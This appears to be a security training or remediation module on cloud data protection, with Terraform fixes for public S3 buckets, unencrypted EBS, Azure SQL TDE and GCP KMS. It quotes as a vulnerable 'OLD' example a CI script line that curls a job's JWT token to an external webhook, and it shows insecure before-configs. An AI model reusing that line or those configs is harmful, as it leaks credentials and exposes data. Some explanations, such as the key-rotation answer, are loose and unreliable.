# Data Protection & Encryption

**Module:** 05 – Data Protection  
**Findings:** FIND-003, FIND-004, FIND-005, FIND-018, FIND-019

---

## Key Issues & Solutions

| Finding | Issue | Solution | Why |
|---------|-------|----------|-----|
| FIND-003 | JWT tokens sent to external webhook | Stop sending tokens externally, OIDC internal only | Tokens are temporary credentials, exfiltration = account takeover |
| FIND-004/005 | S3 buckets public with PII | Block public access + IAM policies | Data breach exposure if leaked |
| FIND-018 | EBS volumes unencrypted | Enable encryption at rest (default enabled) | Stolen disk = readable data without key |
| FIND-019 | Azure SQL unencrypted | Enable TDE (Transparent Data Encryption) | Database backup/stolen VM = readable data |

---

## AWS: Restrict S3 Public Access + Encryption

**Problem:** Public S3 buckets with sensitive data exposed  
**Solution:** Block public access + encryption at rest + encryption in transit

**Key Fix:**
```hcl
# OLD: Public bucket with PII (FIND-004)
resource "aws_s3_bucket" "data" {
  bucket = "company-data-bucket"
}
resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = false  # DANGER
  block_public_policy     = false  # DANGER
  ignore_public_acls      = false
  restrict_public_buckets = false
}

# NEW: Block all public access + encrypt
resource "aws_s3_bucket" "data" {
  bucket = "company-data-bucket"
}

resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Encryption at rest
resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.s3_key.arn
    }
  }
}

# Enforce encryption in transit (SSL only)
resource "aws_s3_bucket_policy" "data_policy" {
  bucket = aws_s3_bucket.data.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Deny"
      Principal = "*"
      Action = "s3:*"
      Resource = [aws_s3_bucket.data.arn, "${aws_s3_bucket.data.arn}/*"]
      Condition = {
        Bool = { "aws:SecureTransport" = "false" }  # HTTP = blocked
      }
    }]
  })
}
```

**EBS Encryption (FIND-018):**
```hcl
# OLD: Unencrypted EBS volume
resource "aws_ebs_volume" "data_volume" {
  availability_zone = "us-east-1a"
  size              = 100
  encrypted         = false  # DANGER
}

# NEW: Encrypted with customer managed key
resource "aws_ebs_volume" "data_volume" {
  availability_zone = "us-east-1a"
  size              = 100
  encrypted         = true
  kms_key_id        = aws_kms_key.ebs_key.arn
}

# Enforce in account (all new EBS encrypted by default)
resource "aws_ec2_ebs_encryption_by_default" "default" {
  enabled = true
}
```

---

## Azure: SQL Transparent Data Encryption (TDE) + Key Vault

**Problem (FIND-019):** SQL Server unencrypted, backup readable  
**Solution:** TDE + Azure Key Vault customer-managed keys

**Key Fix:**
```hcl
# OLD: No encryption
resource "azurerm_mssql_server" "main" {
  name                = "sql-server"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name
  # No encryption specified
}

# NEW: TDE with Key Vault
resource "azurerm_mssql_server" "main" {
  name                = "sql-server"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name
}

resource "azurerm_mssql_server_transparent_data_encryption" "sql_tde" {
  server_id        = azurerm_mssql_server.main.id
  key_vault_key_id = azurerm_key_vault_key.sql_key.id
}

# Backup encrypted at rest
resource "azurerm_mssql_database" "main" {
  name      = "production_db"
  server_id = azurerm_mssql_server.main.id
}
```

**Azure Storage Encryption:**
```hcl
resource "azurerm_storage_account" "main" {
  name                     = "storageaccount"
  resource_group_name      = azurerm_resource_group.main.name
  location                 = azurerm_resource_group.main.location
  account_tier             = "Standard"
  account_replication_type = "GRS"

  identity {
    type = "SystemAssigned"
  }
}

resource "azurerm_storage_account_customer_managed_key" "main" {
  storage_account_id        = azurerm_storage_account.main.id
  key_vault_id              = azurerm_key_vault.main.id
  key_name                  = azurerm_key_vault_key.storage_key.name
  user_assigned_identity_id = azurerm_user_assigned_identity.storage.id
}
```

---

## GCP: Cloud KMS + Cloud Storage Encryption

**Problem:** Unencrypted data in Cloud Storage, Firestore  
**Solution:** Customer-managed keys in Cloud KMS

**Key Fix:**
```hcl
# Create KMS key ring and key
resource "google_kms_key_ring" "main" {
  name     = "data-keyring"
  location = "us-central1"
}

resource "google_kms_crypto_key" "storage_key" {
  name            = "storage-key"
  key_ring        = google_kms_key_ring.main.id
  rotation_period = "7776000s"  # 90 days
}

# Grant Cloud Storage service account permission to use key
resource "google_kms_crypto_key_iam_member" "gcs_access" {
  crypto_key_id = google_kms_crypto_key.storage_key.id
  role          = "roles/cloudkms.cryptoKeyEncrypterDecrypter"
  member        = "serviceAccount:service-${data.google_client_config.current.project_number}@gs-project-accounts.iam.gserviceaccount.com"
}

# Bucket with customer-managed encryption
resource "google_storage_bucket" "data" {
  name          = "company-data-bucket"
  location      = "US"
  force_destroy = false

  encryption {
    default_kms_key_name = google_kms_crypto_key.storage_key.id
  }
}

# Firestore encrypted with KMS
resource "google_firestore_database" "main" {
  location_id     = "us-central1"
  type            = "FIRESTORE_NATIVE"
  cmek_config {
    kms_key_name = google_kms_crypto_key.storage_key.id
  }
}
```

---

## JWT Token Handling (FIND-003)

**Problem:** Tokens sent to external webhooks = credential exfiltration  
**Solution:** Use OIDC tokens internally only, never send externally

**Key Fix:**
```yaml
# OLD: Sends token externally (FIND-003 - vulnerability from Module 02)
script: 'curl --data "$CI_JOB_JWT_V1" https://webhook.site/...'

# NEW: Token used internally for credential exchange ONLY
script: |
  # Exchange token for cloud credentials (inside runner, not external)
  TOKEN=$CI_JOB_JWT_V1
  # Use token to get AWS/GCP credentials from cloud provider
  # NEVER send token to external endpoint
  aws sts get-caller-identity  # Token already used internally
```

---

## Notable Points

**Q: Why encryption at rest AND in transit?**  
> "At rest = if someone steals the disk/backup. In transit = if someone sniffs network traffic. Both needed: attacker can compromise data at any point in its lifecycle."

**Q: Why customer-managed keys instead of AWS/Azure/GCP managed?**  
> "Cloud provider holds all keys by default = could theoretically access your data. Customer-managed means only your organization touches the encryption keys. You also control rotation, retention, and can disable access instantly (key deletion)."

**Q: Why rotate keys every 90 days?**  
> "If a key is compromised, only data encrypted with that specific key is at risk. After rotation, new data uses a new key. Older data encrypted with old key becomes unreadable (to attacker) after key deletion."

**Q: Why TDE for SQL but not S3?**
> "TDE is specifically for databases (encrypts the database at disk level). S3 uses bucket-level encryption + KMS. Both achieve same result (encrypted at rest), just different mechanisms per service."

---

## Remediation Status

| Finding | Action | Status |
|---------|--------|--------|
| FIND-003 | JWT tokens → internal OIDC only (no external webhooks) | ✅ Documented |
| FIND-004 | S3 bucket → block public access + KMS encryption | ✅ Documented |
| FIND-005 | S3 bucket → enforce SSL/TLS in-transit | ✅ Documented |
| FIND-018 | EBS → enable encryption by default | ✅ Documented |
| FIND-019 | Azure SQL → TDE with Key Vault CMK | ✅ Documented |
